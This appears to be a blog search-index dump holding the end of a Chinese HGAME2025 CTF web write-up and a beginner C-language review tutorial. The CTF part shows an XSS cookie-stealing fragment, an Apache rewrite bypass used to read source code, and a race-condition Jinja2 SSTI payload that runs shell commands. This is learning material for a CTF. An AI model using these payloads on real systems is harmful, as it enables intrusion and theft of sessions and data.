document.cookie);\n</script>\n```\n\n传入后访问admin路由触发admin访问留言，然后刷新页面就可以拿到admin的cookie了\n\n![image-20250207002012267](../image/achieve/202411/hgame2025/image-20250207002012267.png)\n\n后面访问flag路由然后伪造admin身份就可以拿到flag了\n\n# ****Level 47 BandBomb****\n\n```js\n//app.js\nconst express = require('express');\nconst multer = require('multer');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\n\napp.set('view engine', 'ejs');\n\napp.use('/static', express.static(path.join(__dirname, 'public')));\napp.use(express.json());\n\nconst storage = multer.diskStorage({\n  destination: (req, file, cb) => {\n    const uploadDir = 'uploads';\n    if (!fs.existsSync(uploadDir)) {\n      fs.mkdirSync(uploadDir);\n    }\n    cb(null, uploadDir);\n  },\n  filename: (req, file, cb) => {\n    cb(null, file.originalname);\n  }\n});\n\nconst upload = multer({ \n  storage: storage,\n  fileFilter: (_, file, cb) => {\n    try {\n      if (!file.originalname) {\n        return cb(new Error('无效的文件名'), false);\n      }\n      cb(null, true);\n    } catch (err) {\n      cb(new Error('文件处理错误'), false);\n    }\n  }\n});\n\napp.get('/', (req, res) => {\n  const uploadsDir = path.join(__dirname, 'uploads');\n  \n  if (!fs.existsSync(uploadsDir)) {\n    fs.mkdirSync(uploadsDir);\n  }\n\n  fs.readdir(uploadsDir, (err, files) => {\n    if (err) {\n      return res.status(500).render('mortis', { files: [] });\n    }\n    res.render('mortis', { files: files });\n  });\n});\n\napp.post('/upload', (req, res) => {\n  upload.single('file')(req, res, (err) => {\n    if (err) {\n      return res.status(400).json({ error: err.message });\n    }\n    if (!req.file) {\n      return res.status(400).json({ error: '没有选择文件' });\n    }\n    res.json({ \n      message: '文件上传成功',\n      filename: req.file.filename \n    });\n  });\n});\n\napp.post('/rename', (req, res) => {\n  const { oldName, newName } = req.body;\n  const oldPath = path.join(__dirname, 'uploads', oldName);\n  const newPath = path.join(__dirname, 'uploads', newName);\n\n  if (!oldName || !newName) {\n    return res.status(400).json({ error: ' ' });\n  }\n\n  fs.rename(oldPath, newPath, (err) => {\n    if (err) {\n      return res.status(500).json({ error: ' ' + err.message });\n    }\n    res.json({ message: ' ' });\n  });\n});\n\napp.listen(port, () => {\n  console.log(`服务器运行在 http://localhost:${port}`);\n});\n\n```\n\n先进行代码审计\n\n```\napp.use('/static', express.static(path.join(__dirname, 'public')));\n```\n\n- `app.use()` 是 Express 应用程序的方法，用于将中间件函数附加到应用程序的请求处理流程中。它可以用于处理所有 HTTP 请求类型\n- **`'/static`**指定了当客户端请求以 `/static` 开头的路径时，后续的中间件（在这里是 `express.static`）将会处理这些请求。\n- `express.static` 是 Express 提供的一个内置中间件，用于为应用提供静态文件服务。它可以为指定的目录提供静态资源\n- `path.join` 是 Node.js 内置的 `path` 模块的方法，用于安全地连接文件和目录路径。\n- `__dirname` 是一个全局变量，表示当前执行脚本所在的目录的绝对路径。\n\n先放着吧，这个知识点还没学，学完了再回来写\n\n# **Level 38475 角落**\n\n## #url重写漏洞+ssti条件竞争\n\n题目提示会有管理员查看留言\n\n![image-20250222115011381](../image/achieve/202411/hgame2025/image-20250222115011381.png)\n\n![image-20250222115238416](../image/achieve/202411/hgame2025/image-20250222115238416.png)\n\n传了一个`<script>alert(\"1\")</script>`显示上传成功但是没得弹窗警告，扫目录看到一个有robots.txt，给了一个/app.conf\n\n```\n# Include by httpd.conf\n<Directory \"/usr/local/apache2/app\">\n\tOptions Indexes\n\tAllowOverride None\n\tRequire all granted\n</Directory>\n\n<Files \"/usr/local/apache2/app/app.py\">\n    Order Allow,Deny\n    Deny from all\n</Files>\n\nRewriteEngine On\nRewriteCond \"%{HTTP_USER_AGENT}\" \"^L1nk/\"\nRewriteRule \"^/admin/(.*)$\" \"/$1.html?secret=todo\"\n\nProxyPass \"/app/\" \"http://127.0.0.1:5000/\"\n```\n\n分析一下这个配置文件，app.py不让访问，我们重点看一下URL重写规则\n\n```html\nRewriteEngine On//开启 Apache 的 URL 重写模块\nRewriteCond \"%{HTTP_USER_AGENT}\" \"^L1nk/\"%{HTTP_USER_AGENT}表示客户端发送的 HTTP 请求中的用户代理字符串（User-Agent），如果UA头中包含 L1nk/ 字符串，则后续的重写规则将会被应用\nRewriteRule \"^/admin/(.*)$\" \"/$1.html?secret=todo\"\n```\n\n- RewriteRule \"^/admin/(.*)$\" \"/$1.html?secret=todo\"\n\n什么意思呢?就是当我访问/admin/???目录的时候Apache 会尝试在文件系统中查找 `/???.html` 文件\n\n阿帕奇的URL重写规则\n\n![image-20250222121757897](../image/achieve/202411/hgame2025/image-20250222121757897.png)\n\n试着去拿一下app.py但是没拿到，应该是路径问题\n\n后面找文档看到有版本CVE\n\n![image-20250222123722368](../image/achieve/202411/hgame2025/image-20250222123722368.png)\n\nApache 的文档根目录（`DocumentRoot`）通常是 `/usr/local/apache` 或类似路径。直接读app.py\n\n![image-20250222123531139](../image/achieve/202411/极客大挑战2020/image-20250222123531139.png)\n\n只需要在最后加一个%3f即可，这会把app.py后面的东西变成查询语句。\n\n```py\n//app.py\nfrom flask import Flask, request, render_template, render_template_string, redirect\nimport os\nimport templates\n\napp = Flask(__name__)\npwd = os.path.dirname(__file__)\nshow_msg = templates.show_msg\n\n\ndef readmsg():\n\tfilename = pwd + \"/tmp/message.txt\"\n\tif os.path.exists(filename):\n\t\tf = open(filename, 'r')\n\t\tmessage = f.read()\n\t\tf.close()\n\t\treturn message\n\telse:\n\t\treturn 'No message now.'\n\n\n@app.route('/index', methods=['GET'])\ndef index():\n\tstatus = request.args.get('status')\n\tif status is None:\n\t\tstatus = ''\n\treturn render_template(\"index.html\", status=status)\n\n\n@app.route('/send', methods=['POST'])\ndef write_message():\n\tfilename = pwd + \"/tmp/message.txt\"\n\tmessage = request.form['message']\n\n\tf = open(filename, 'w')\n\tf.write(message) \n\tf.close()\n\n\treturn redirect('index?status=Send successfully!!')\n\t\n@app.route('/read', methods=['GET'])\ndef read_message():\n\tif \"{\" not in readmsg():\n\t\tshow = show_msg.replace(\"{{message}}\", readmsg())\n\t\treturn render_template_string(show)\n\treturn 'waf!!'\n\t\n\nif __name__ == '__main__':\n\tapp.run(host = '0.0.0.0', port = 5000)\n```\n\n路由/read是用来渲染的，是ssti，先传一个7*7然后访问/read路由\n\n![image-20250222125751104](../image/achieve/202411/hgame2025/image-20250222125751104.png)\n\n能正常访问处理，因为这里会检查是否包含`{`，之前没学过过滤了这个怎么做，后面看的师傅的wp知道这里是需要条件竞争的，因为我们需要写文件读文件，那么这里可以可以用条件竞争来做。\n\n需要一个正常/send包，一个写文件的/send包，一个读文件的/read包\n\n我们用lipsum获取os模块，三个包设置如下\n\n![image-20250222131347646](../image/achieve/202411/hgame2025/image-20250222131347646.png)\n\n![image-20250222131409577](../image/achieve/202411/hgame2025/image-20250222131409577.png)\n\n![image-20250222131429676](../image/achieve/202411/hgame2025/image-20250222131429676.png)\n\npayload\n\n```\nmessage={{lipsum.__globals__.__builtins__.__import__('os').popen('ls').read()}}\n```\n\n![image-20250222131319867](../image/achieve/202411/hgame2025/image-20250222131319867.png)\n\n然后换一下rce命令再竞争一下就可以了\n\n![image-20250222131700129](../image/achieve/202411/hgame2025/image-20250222131700129.png)\n\n# Level 25 双面人派对\n\n还需要逆向分析，压根不会，可以看看infernity师傅的wp\n\n[Hgame2025 week1 Web WP](https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9)\n\n# **Level 21096 HoneyPot**\n\n","tags":["HGAME2025"],"categories":["赛题wp"]},{"title":"c语言复习纪录","url":"/2025/02/20/c语言复习纪录/","content":"\n# 0x01前言\n\n好久没看c语言了，趁着最近要准备c语言考试再重新回顾一下，这里主要是为了复习，但是也会尽量把很多概念理清楚，很适合小白学习\n\n# 0x02正文\n\n# C语言的特点\n\n先讲讲c语言的两大特点\n\n- c语言是一门面向过程(结构化)的语言\n- c语言是编译型语言\n\n那这里有小白要问了，什么是面向过程的语言?什么是编译型语言?\n\n## 面向过程和面向对象\n\n面向过程的语言也称为结构化程序设计语言，**是高级语言的一种**。 在面向过程程序设计中，问题被看作一系列需要完成的任务，函数则用于完成这些任务，解决问题的焦点集中于使用函数。 \n\n面向对象的语言是**一类以对象作为基本程序结构单位的程序设计语言**，指用于描述的设计是以对象为核心，而对象是程序运行时刻的基本成分。 语言中提供了类、对象、封装、继承、多态等成分，有识认性、多态性、类别性和继承性四个主要特点。\n\n这是抽象的概念，我举个例子就能理解了，例如我们把程序看成一辆车，那么这辆车就包括很多组件，这些组件我们可以去各个厂商进口，也可以自己造，那么我们自己造车的话就需要把各个组件其中的各个零件做出来，那么这个过程就是很重要的，这也就可以被看成是面向过程的语言，而我们如果去进口的话，每个组件就包含了很多个零件，只需要把这些组件组装起来，那么最后造出来的车就是最重要的，这也就可以被看成是面向对象的语言，说的简单点就是一个看重过程另一个更看重结果\n\n因为这里是复习C语言所以这个就不赘述了，借一个师傅的文章给参考一下\n\n[一文带你搞懂什么是“面向过程”与“面向对象”](https://blog.csdn.net/weixin_62261692/article/details/130284983)\n\n然后我们解决第二个问题，什么是编译型和解释型\n\n## 什么是编译型和解释型\n\n高级语言转化成机器语言的时候，有两种处理方式，即编译和解释。编译型语言编写的程序执行之前，需要一个专门的编译过程，把整个源程序编译成机器语言，后面要运行的话就不需要重新编译了，直接使用编译的结果就可以了。所以编译型的程序执行效率更高，解释型语言则不同，解释型语言需要在运行的时候边执行边翻译，比如python，会专门有一个解释器能够执行程序，每个语句都是运行的时候才编译，所以效率比较低。\n\n例如我们需要做一道外国菜，这时候就有两个方式可以去做，一个是买翻译过的食谱，一个是找一个外国朋友每个步骤给你翻译解释，前者就是编译型，后者就是解释型。\n\n## C语言程序的实现过程\n\n**编辑源程序(Hello.c)->编译目标程序(Hello.obj)->连接生成可执行程序(Hello.exe)->运行**\n\n> [!IMPORTANT]\n>\n> 这里的.obj文件和.exe文件都是二进制文件，但只有exe文件可以运行\n\n## C 程序主要组成部分\n\n- 预处理器指令\n- 函数\n- 变量\n- 语句 & 表达式\n- 注释\n\n说那么多，不如直接上机实操讲解\n\n先写程序员最常见的HelloWorld程序\n\n```c\n#include <stdio.h>\nint main(){\n    printf(\"HelloWorld!\\n\");\n    return 0;\n}\n```\n\n解释一下这段基础代码\n\n- line1:预处理指令，用于包含标准输入输出库的头文件stdio.h\n- line2:main为c语言主函数，所有代码从主函数开始执行和结束执行，int表示函数的返回值需要是int类型的整数值，函数需要用大括号包含 \n- line3:注释`/**/`表示多行注释 (反斜杠为转义)\n- line4:printf为输出函数，用于把字符串完整输出到标准输出控制台,\\n表示换行\n- line5:return语句用于结束函数执行并返回一个值，这里返回整数值0表示函数正常终止 \n\n可以看到运行结果\n\n![image-20250220102209427](../image/achieve/202411/C语言/image-20250220102209427.png)\n\n# C语言语法基础\n\n在讲解语法基础前先讲几个前置知识\n\n- 分割符\n\n分隔符用于分隔语句和表达式，常见的分隔符包括：\n\n- **逗号 \\**,\\**** ：用于分隔变量声明或函数参数。\n- **分号 \\**;\\**** ：用于结束语句。\n- 括号\n  - 圆括号 **`()`** 用于分组表达式、函数调用。\n  - 花括号 **`{}`** 用于定义代码块。\n  - 方括号 **`[]`** 用于数组下标。\n\n在 C 程序中，分号 **;** 是语句结束符，也就是说，每个语句必须以分号结束，它表明一个逻辑实体的结束。\n\n- 注释\n\n有两种注释，单行注释`//`和多行注释`/**/`\n\n一个程序通常由很多个词法组成，其中包括关键字，标识符，数据类型，常量，变量，运算符等等，接下来我们逐一讲解\n\n## 关键字\n\n关键字是一类被C语言保留使用的有特定的专门含义的单词，如int,void,for等，这类单词不能用作标识符\n\n|    asm     |    auto    |    break     | case         |\n| :--------: | :--------: | :----------: | ------------ |\n|  **char**  | **const**  | **continue** | **default**  |\n|   **do**   | **double** |   **else**   | enum         |\n| **extern** |    far     |  **float**   | **for**      |\n|  **goto**  |   **if**   |   **int**    | **long**     |\n|    near    |  register  |  **return**  | **short**    |\n| **signed** | **sizeof** |  **static**  | struct       |\n| **switch** |  typedef   |    union     | **unsigned** |\n|  **void**  |  volatile  |  **while**   |              |\n\n## 标识符\n\n在C语言中，许多符号的命名必须遵守一定的命名规则，按此规则命名的符号就称为标识符，标识符是指给程序中的实体所起的名字，如变量，函数，数组，指针，常量，结构体以及文件名，简单来说就是一个名字\n\n标识符的命名规则如下：\n\n- 标识符可以包含字母(a-z,A-Z)数字(0-9)和下划线(_)；\n- 标识符必须以字母或下划线开头\n- 标识符不能包含空格\n- 关键字不能作为标识符\n\n> [!IMPORTANT]\n>\n> C语言是大小写敏感的，例如我们定义变量 int while是错的，但是int WHILE是对的，因为WHILE和while不一样，WHILE不是关键字\n>\n> 标识符应“见名思义”为好，且一般函数名，变量名用小写，符号常量用大写，如若标识符为两个及以上的单词组成，应该用下划线或者大小写去分割开，例如database_name,DatabaseName。\n\n## 数据类型\n\n在C 语言中，数据类型指的是**用于声明不同类型的变量或函数的一个广泛的系统**。 变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。不同类型处理不同的数据，相同数据类型的数据可以进行一些特定的操作和运算\n\nC语言的数据类型包括基本数据类型，构造类型，指针类型和空类型(void)\n\n![4892099fdd06decb367bb5b684a885f](../image/achieve/202411/C语言/4892099fdd06decb367bb5b684a885f.jpg)\n\n我们先讲基本数据类型和空类型，其他的例如构造类型中的数组类型之类的放在后头再细说\n\n### 基本数据类型\n\n**基本数据类型包括数值类型(整数类型，实数类型)，字符类型和枚举类型**\n\n我们先讲数值类型\n\n#### 数值类型\n\n|      类型      |      类型描述      | 字节数 |     值范围      |\n| :------------: | :----------------: | :----: | :-------------: |\n|      char      |       字符型       |   1    |  -2^7 到 2^7-1  |\n| unsigned char  |    无符号字符型    |   1    |   0 到  2^8-1   |\n|  signed char   | 有符号字符型(char) |   1    |  -2^7 到 2^7-1  |\n|     short      |       短整型       |   2    | -2^15 到 2^15-1 |\n| unsigned short |    无符号短整型    |   2    |   0 到 2^16-1   |\n|  signed short  |    有符号短整型    |   2    | -2^15 到 2^15-1 |\n|      int       |        整型        |   4    | -2^31 到 2^31-1 |\n|  unsigned int  |     无符号整型     |   4    |   0 到 2^32-1   |\n|   signed int   |     有符号整型     |   4    | -2^31 到 2^31-1 |\n\n|     类型      |    类型描述    | 字节数 |              值范围              |\n| :-----------: | :------------: | :----: | :------------------------------: |\n|     long      |     长整型     |   4    |         -2^31 到 2^31-1          |\n| unsigned long |  无符号长整形  |   4    |           0 到 2^32-1            |\n|  signed long  |  有符号长整型  |   4    |         -2^31 到 2^31-1          |\n|     float     |  单精度浮点型  |   4    |  7位有效位(1.2E-38 到 3.4E+38)   |\n|    double     |  双精度浮点型  |   8    | 15位有效位(2.3E-308 到 1.7E+308) |\n|  long double  | 长双精度浮点型 |   16   |            19位有效位            |\n|   long long   |    长长整型    |   8    |         -2^63 到 2^63-1          |\n\n不同系统的字节数可能不一样，如果我们想获取不同数据类型的存储字节大小，可以用sizeof()函数，接下来我们实践看看\n\n```c\n#include <stdio.h>\n\nint main() {\n    printf(\"char: %zu bytes\\n\", sizeof(char));\n    printf(\"short: %zu bytes\\n\", sizeof(short));\n    printf(\"int: %zu bytes\\n\", sizeof(int));\n    printf(\"long: %zu bytes\\n\", sizeof(long));\n    printf(\"long long: %zu bytes\\n\", sizeof(long long));\n    printf(\"float: %zu bytes\\n\", sizeof(float));\n    printf(\"double: %zu bytes\\n\", sizeof(double));\n    printf(\"long double: %zu bytes\\n\", sizeof(long double));\n    return 0;\n}\n```\n\n![image-20250220115857967](../image/achieve/202411/C语言/image-20250220115857967.png)\n\n`%zu` 将用于打印 `sizeof(int)` 和 `sizeof(double)` 的结果，这将显示这些数据类型在当前平台上所占的字节数。\n\n### 空类型(void)\n\nvoid 类型指定没有可用的值。它通常用于以下三种情况下：\n\n- 函数返回值为空，例如我们的主函数**void mian**\n- 函数参数为空，C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 **int name(void);**\n- 指针指向void，类型为 void * 的指针代表对象的地址，而不是类型。\n\n讲完数据类型，我们接下来讲数据\n\n在C语言中的数据可以分为两种，常量和变量，我们先讲常量\n\n## 常量\n\n常量通常是指在程序运行的时候值固定不变的量\n\n常量通常有两种形式:一种是字面常量或直接常量，一种是符号常量或有名常量。一般从字面形式上可以判别的常量称为字面常量或直接常量，而符号常量通常是一个程序中指定的用名字代表的常量，从字面上看不出其类型的值\n\n*常量可以直接在代码中使用，也可以通过定义常量来使用。*\n\n接下来我们讲一下字面常量\n\n## 字面常量\n\n### 整型常量\n\n整数常量即int型常量，说白了就是整数，它可以是十进制、八进制或十六进制的常量\n\n先讲讲整型常量的前缀\n\n- 十进制整数(无前缀)\n\n就是我们日常见到的整数，十进制的基本字符为:0,1,2,...,9。\n\n- 八进制整数(以0为前缀)\n\n以0开头的整数为八进制整数，八进制的基本字符为:0,1,2,...,7。\n\n- 十六进制(以0和大小写x为前缀)\n\n以0和大小写字母x开头的整数为十六进制整数，十六进制整数的基本字符为0~9,A~F或0~9，a~f。\n\n关于进制转化的问题我之前学的比较模糊，这次也是把他理清楚了写下来。\n\n#### 进制转化\n\n- 十进制转八进制\n\n用十进制数除以8取余，商再除以8，直到商为0，余数从右到左排列。\n\n例如136，136除以8=17余0，17除以8=2余1，2除以8=0余2，那么八进制就是210\n\n- 八进制转十进制\n\n用八进制每位上的数乘以位权，整数从右向左依次乘以8的n次方（n从0开始）。\n\n例如八进制210，0\\*8的0次方+1\\*8的1次方+2\\*8的2次方=136十进制数\n\n同理十六进制和十进制之间的转换也是一样的，这里就不再赘述了\n\n再讲讲的后缀\n\n整型变量可分为整型`int`,短整型`short int`,长整型`long int`,无符号整型`unsigned int`，在 整型常量的末尾加上后缀可以表示该整型常量的类型\n\n后缀是 U 和 L 的组合，U 表示无符号整数（unsigned），L 表示长整数（long）。后缀可以是大写，也可以是小写，U 和 L 的顺序任意。\n\n举个例子\n\n```c\n30         /* 整数 */\n0213       /* 八进制 */\n0x4b       /* 十六进制 */\n30u        /* 无符号整数 */\n30L        /* 长整数 */\n30ul       /* 无符号长整数 */\n```\n\n### 实型常量(浮点型常量)\n\n浮点常量由整数部分、小数点、小数部分和指数部分组成。它有两种形式，一种是小数形式，一种是指数形式\n\n- 小数点表示\n\n就是我们常说的小数，例如3.75。但是这里要注意的是用十进制表示的浮点型常量`必须有小数点`\n\n- 指数形式表示(科学表示法)\n\n类似2.3e23这样的指数式，在C语言中，以e或E后跟一个整数来表示以10为底数的幂数。\n\n`[小数部分]e或E[整数部分]`\n\n但是对于指数形式来说，一个浮点常量在用指数形式输出时，我们通常需要按规范化的指数形式去输出，那么我们讲一下规范化的指数形式\n\n例如456.789可以表示成456.789e0,45.6789e1,4.56789e2,0.456789e3等，其中4.56789e2是最为规范的指数形式，为什么呢？接下来我们了解一下\n\n最为规范的指数形式的要求\n\n- 小数部分规定小数点左边必须有一位非0的数字(且只能有一位)\n\n当使用小数形式表示时，必须包含整数部分、小数部分，或同时包含两者。当使用指数形式表示时， 必须包含小数点、指数，或同时包含两者。带符号的指数是用 e 或 E 引入的。\n\n### 字符常量\n\n字符常量是用两个单引号包括起来的字符，例如`'a'`,`'z'`等，字符常量可以是一个普通的字符，也可以是一些特殊的字符转义字符\n\n转义字符是以`'\\'`开始的字符，当一些特定的字符加上反斜杠后他们就具有了特殊的含义，下面写一下\n\n| 转义字符 |            含义            |\n| :------: | :------------------------: |\n|    \\a    |            响铃            |\n|    \\n    |            换行            |\n|    \\t    |         水平制表符         |\n|    \\v    |         垂直制表符         |\n|    \\b    |           退格符           |\n|    \\r    |            回车            |\n|    \\f    |           换页符           |\n|   \\\\\\    |       转义反斜杠(\\\\)       |\n|   \\\\'    |       转义单引号(\\')       |\n|   \\\\\"    |       转义双引号(\\\")       |\n|    \\?    |        转义问号(?)         |\n|   \\000   |     一到三位的八进制数     |\n|   \\xhh   | 一个或多个数字的十六进制数 |\n\n> [!IMPORTANT]\n>\n> 在ASCII码中，字符和整数有一一对应关系，因此一个字符常量具有双重属性，它既是一个字符又是一个整数\n>\n> 另外，不能用双引号代替单引号，且单引号中的字符不能是单引号或者反斜杠,需要转义之后才可以表示成字符单引号和字符反斜杠\n\n这些转义字符可用于表达常用的特殊字符，但利用\\\\000和\\\\xhh可以表达ASCII码表中的字符，例如`'a'`字符对应的ASCII码的十进制是97，对应的八进制是0141，对应的十六进制是0x61，那么我们可以用'\\\\141'或'\\\\x61'来表示字符`'a'`\n\n接下来我们试一下\n\n```c\n#include <stdio.h>\nint main(){\n\t//printf(\"%c%c%c%c%c\",'a','A','z','Z','\\n'); //显示aAzZ并换行\n\t//printf(\"%c%c%c%c%c\",'\\141','\\101','\\172','\\132','\\n'); //八进制 显示aAzZ并换行\n\t//printf(\"%c%c%c%c%c\",'\\x61','\\x41','\\7A','\\x5A','\\n');//十六进制 显示aAzZ并换行 \n\t//printf(\"%c%c%c\",'\\a','\\n','\\x7');//\\a和\\x7等价，都表示响铃 \n\t//printf(\"%s%c%c%c\",\"123\",'\\b','x','\\n');//'\\b'回退一格然后显示x,结果为12x并换行 \n\t//printf(\"%s%c%c%c\",\"123\",'\\r','a','\\n'); //'\\r'回到行首后显示a，结果为a23并换行\n\tprintf(\"%c%c%c%c%c\",'a','\\\\','\\'','\\\"','\\n'); //转义反斜杠单引号和双引号，结果为a\\'\" \n\treturn 0;\n}\n```\n\n### 字符串常量\n\n字符串字面值或常量是括在一对双引号`\"\"` 中的。一个字符串常量是一个特殊的字符序列或字符数组\n\n但是在C语言中，并没有专门的字符串变量，通常我们会用字符数组去存放一个字符串，当我们定义一个字符数组的时候，系统会自动分配足够的内存来存储字符串的所有字符和一个 null 字符 `'\\0'`。\n\n> [!IMPORTANT]\n>\n> 需要注意的是，字符串常量的长度为该字符串所有字符的个数加1，原因是字符串末尾还有一个终止符`\\0`，这就可以讲到字符常量和字符串常量的区别了\n\n我们看看下面的比较，`'a'`是字符，`\"a\"`是字符串，不仅仅在于引号的区别，还在于他们存储空间值的不同，字符通常只占一个字符，而字符串至少需要2个字符，是因为C编译系统会自动地在字符串末尾加上终止符，这也意味着我们在写字符串的时候不需要写终止符，但是如果我们在字符串中间加上终止符的话，系统会把终止符后面的字符忽略掉，接下来我们实践看一下\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    //使用指针定义一个字符串常量\n    //const char* str = \"Hello, World!\";//长度13\n\t//const char* str = \"Hello, Wor\\0ld!\" ;//长度为10\n    \n    //使用字符数组定义\n    \n    //char str[] = \"Hello, World!\";//长度13\n    \n    char str[] = \"Hello, Wor\\0ld!\";//长度为10\n    size_t length = strlen(str);  // 获取字符串长度\n\n    printf(\"长度为%zu\\n\", length);\n    return 0;\n}\n```\n\n此外还需要讲一个特别需要注意的点，就是当我们在使用八进制或十六进制转义字符作为字符串常量的时候，应避免产生二义性，例如`\"\\x5fc\"`字符串就让人难以区分到底是`'\\x5','f','c'`还是`'\\x5f','c'`\n\n讲完了字面常量，接下来我们讲一下符号常量\n\n## 符号常量\n\n简单来说就是用一个符号来代表一个常量，这个符号必须符合标识符的命名规则(通常用大写字母来命名)\n\n定义符号常量有两种方法\n\n- 预处理中的宏定义#define。\n\n格式\n\n```\n#define 常量名 常量值\n```\n\n例如 ： #define PAI=3.14      #define PAI 3.14这两个写法都是可以的\n\n因为宏定义是预处理指令，需要写在所有函数之前，且这种定义方法`不需要写数据类型`，也`不用在末尾加分号`\n\n我们试一下\n\n```c\n#include <stdio.h>\n#define PAI 3.14\n#define value 3\n#define name 'a' \nint main(){\n\tprintf(\"PAI=%d\\n\",PAI);//这里的话输出的就不是我们的PAI常量\n\tprintf(\"PAI=%lf\\n\",PAI);\n\tprintf(\"value=%d\\n\",value);\n\tprintf(\"name=%c\\n\",name);\n    return 0;\n}\n```\n\n![image-20250220153804376](../image/achieve/202411/C语言/image-20250220153804376.png)\n\n这里可以看到一个关注点，我们在使用define定义常量之后使用这个常量的时候`需要注意常量的类型`例如上面的当我们使用 `%d` 来打印一个浮点数（`double` 或 `float`），程序可能会输出垃圾值\n\n- 使用 **const** 关键字\n\nconst 关键字用于声明一个只读变量，即该变量的值不能在程序运行时修改。\n\n格式\n\n```\nconst 数据类型 常量名 = 常量值;\n```\n\n例如： const int MAX_VALUE= 100;\n\n> [!IMPORTANT]\n>\n> 注意，const 声明常量要在一行语句内完成\n\n接下来我们试一下\n\n```c\n#include <stdio.h>\nint main(){\n\tconst double PAI = 3.14;\n\tconst int value = 100;\n\tconst char name = 'a';\n\tprintf(\"PAI=%lf\\n\",PAI);\n\tprintf(\"value=%d\\n\",value);\n\tprintf(\"name=%c\\n\",name);\n\treturn 0;\n}\n```\n\n![image-20250220154340565](../image/achieve/202411/C语言/image-20250220154340565.png)\n\n### #define 与 const 区别\n\n直接摘的[菜鸟教程](https://www.runoob.com/cprogramming/c-constants.html)的说法\n\n- 替换机制：`#define` 是进行简单的文本替换，而 `const` 是声明一个具有类型的常量。`#define` 定义的常量在编译时会被直接替换为其对应的值，而 `const` 定义的常量在程序运行时会分配内存，并且具有类型信息。\n- 类型检查：`#define` 不进行类型检查，因为它只是进行简单的文本替换。而 `const` 定义的常量具有类型信息，编译器可以对其进行类型检查。这可以帮助捕获一些潜在的类型错误。\n- 作用域：`#define` 定义的常量没有作用域限制，它在定义之后的整个代码中都有效。而 `const` 定义的常量具有块级作用域，只在其定义所在的作用域内有效。\n- 调试和符号表：使用 `#define` 定义的常量在符号表中不会有相应的条目，因为它只是进行文本替换。而使用 `const` 定义的常量会在符号表中有相应的条目，有助于调试和可读性。\n\n## 变量\n\n所谓变量，就是可以在程序运行过程中值可以改变的量，**C 中每个变量都有特定的类型，类型决定了变量存储的大小和布局，该范围内的值都可以存储在内存中，运算符可应用于变量上。**\n\n> [!IMPORTANT]\n>\n> 记住！变量必须先声明后使用\n\n变量代表内存中具有特定属性的一个存储单元\n\n这句话怎么理解呢？其实我们的变量就是内存中的一个存储区域，该区域有自己的名称(变量名)和类型(数据类型)，根据数据类型的不同，变量会被分配不同的存储单元空间，实际上操作变量的过程就是操作内存的过程\n\nC语言中有两种变量:\n\n1. 在函数或块内部的**局部**变量\n2. 在所有函数外部的**全局**变量\n\n那我们看看这三种变量有什么区别\n\n## 变量的作用域分类\n\n### 局部变量\n\n在某个函数或复合语句(代码块内)的内部声明的变量称为局部变量。它们只能被该函数或该复合语句内部的语句使用。有参函数的形式参数也是局部变量。局部变量在函数外部是不可知的。\n\n局部变量所在的函数被调用和执行时，系统会临时给局部变量分配存储单元，一旦函数调用结束，这些局部变量的存储单元将被释放\n\n### 全局变量\n\n全局变量是定义在函数外部，通常是在程序的顶部。全局变量从定义的位置开始到本源程序运行结束都可使用，在任意的函数内部能访问全局变量。\n\n> [!IMPORTANT]\n>\n> 在程序中，局部变量和全局变量的名称可以相同，但是在函数内，如果两个名字相同，会使用局部变量值，全局变量不会被使用。\n\n### 变量的存储类别\n\nC 语言的内存模型主要分为几个区域，每个区域在程序运行时都有特定的角色：\n\n- **栈区（Stack）**：用于存储局部变量和函数调用的参数，内存由编译器自动管理。\n- **堆区（Heap）**：用于存储动态分配的内存，由程序员手动管理。\n- **全局/静态区（Data Segment）**：用于存储全局变量和静态变量，内存生命周期从程序启动到结束。\n- **文本区（Text Segment）**：存储程序代码，包括字符串常量。\n\n#### 静态和动态存储方式\n\n通常我们编译后的c程序，在内存中占有的存储空间通常分为程序代码区，静态存储区和动态存储区三个部分\n\n- 程序代码区用于存放程序代码指令\n- 静态存储区是指分配给变量空间固定的存储空间，且在整个程序运行期间，其存储空间会一直保留而不被释放\n- 动态存储区是指分配给不需要占有固定存储单元的变量使用的存储空间，只在程序执行过程中需要时才会临时开辟存储单位，用完后自动释放空间\n\nC语言中变量根据存储方式可以分为四种\n\n1. auto自动存储类别\n2. extern外部存储类别\n3. register寄存器存储类别\n4. static静态存储类别\n\n所以我们定义一个变量的时候的完整格式应该是\n\n```\n存储类别 数据类型 变量名列表;\n```\n\n### 局部变量的存储类别\n\n#### auto自动存储类别\n\nauto是C语言中使用最多的存储方式，也是系统默认的存储方式，例如我们在函数内或复合语句内定义的局部变量，函数形参，通常我们对这些变量进行定义的时候都没有加上存储类别，这时候都会默认为auto自动存储类别\n\nauto自动存储类别属于局部变量的范畴，且自动变量都是动态分配存储空间，生存期为该变量所在的函数或代码块中的执行期间，当在执行函数和代码块的时候，系统会自动为这些变量开辟临时的存储单元，在执行完后释放，原来的值也将丢失。\n\n> [!IMPORTANT]\n>\n> 在对自动变量进行定义的时候最好养成初始化的习惯，如果没有初始化，系统不会自动赋初值，此时可能是垃圾值，所以一定要养好习惯\n\n#### static静态存储类型\n\n由static修饰的局部变量，都属于静态变量，其存储空间在静态存储区中且固定保留，因此`在此变量所在函数或代码块执行结束后仍然会保留变量值`\n\n对于静态局部变量的初值是在我们编译的时候就一次性赋予的，对于未赋初值的静态局部变量，系统会自动赋默认值\n\n#### register寄存器存储类型\n\n这个在C语言中用的比较少，这个存储方式是将相关的变量存储在CPU的通用寄存器中，而并未内存中，但是CPU的寄存器数目有限，且存放在寄存器中的变量不能进行取地址运算。\n\n只有动态局部变量才能定义成寄存器变量，全局变量和静态局部变量则不行。\n\n### 全局变量的存储类别\n\n#### extern外部存储类型\n\nextern是用于声明全局变量的，全局变量作用域是从定义变量开始到源文件运行结束，采用extern声明全局变量主要用于扩大全局变量的作用域。\n\n例如\n\n```c\n#include <stdio.h>\nint main(){\n    return 0;\n}\nint a=10,b=20;\nint fun(int x,int y){\n    x=a;\n    y=b;\n    return 